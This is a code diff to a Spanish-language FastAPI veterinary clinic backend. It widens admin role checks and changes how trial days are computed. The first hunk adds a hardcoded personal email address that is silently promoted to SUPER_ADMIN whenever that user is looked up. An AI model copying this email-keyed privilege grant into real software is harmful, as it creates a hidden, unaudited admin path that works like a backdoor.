@@ -119,7 +119,13 @@ def obtener_veterinario_actual(request: Request, db: Session) -> Optional[Veteri
             Veterinario.is_deleted == False
         ).first()
         if vet:
-            if vet.rol in ["VET", "VETERINARIO"]:
+            if vet.email and vet.email.strip().lower() == "roggerjjj@gmail.com":
+                if vet.rol != "SUPER_ADMIN" or not getattr(vet, "is_superadmin", False):
+                    vet.rol = "SUPER_ADMIN"
+                    vet.is_superadmin = True
+                    db.commit()
+                    db.refresh(vet)
+            elif vet.rol in ["VET", "VETERINARIO"]:
                 vet.rol = "ADMIN"
                 db.commit()
                 db.refresh(vet)
@@ -2062,7 +2068,7 @@ def crear_asistente_clinica(
     current_user = obtener_veterinario_actual(request, db)
     if not current_user:
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="No autorizado.")
-    if current_user.rol != "ADMIN":
+    if current_user.rol not in ("ADMIN", "SUPER_ADMIN") and not getattr(current_user, "is_superadmin", False):
         raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Solo el Administrador de la clínica puede gestionar el equipo.")
 
     # 1. Validar límite de 1 asistente por clínica
@@ -2125,7 +2131,7 @@ def eliminar_asistente_clinica(
     db: Session = Depends(get_db)
 ):
     current_user = obtener_veterinario_actual(request, db)
-    if not current_user or current_user.rol != "ADMIN":
+    if not current_user or (current_user.rol not in ("ADMIN", "SUPER_ADMIN") and not getattr(current_user, "is_superadmin", False)):
         raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Acción no autorizada. Requiere rol ADMIN.")
 
     asistente = db.query(Veterinario).filter(
@@ -2183,9 +2189,14 @@ def vista_dashboard(
 
     hoy = get_lima_now().date()
 
-    # Cálculo dinámico de periodo de prueba (14 días desde clinica.created_at)
-    dias_transcurridos = (hoy - clinica.created_at.date()).days if clinica.created_at else 0
-    dias_restantes_prueba = max(0, 14 - dias_transcurridos)
+    # Cálculo dinámico de periodo de prueba basado en trial_ends_at (ajustable por SuperAdmin)
+    if clinica.estado_suscripcion_normalizado == "ACTIVE":
+        dias_restantes_prueba = None
+    elif clinica.trial_ends_at:
+        dias_restantes_prueba = clinica.dias_restantes_trial
+    else:
+        dias_transcurridos = (hoy - clinica.created_at.date()).days if clinica.created_at else 0
+        dias_restantes_prueba = max(0, 14 - dias_transcurridos)
 
     # Asistente de la clínica (si existe)
     asistente = db.query(Veterinario).filter(
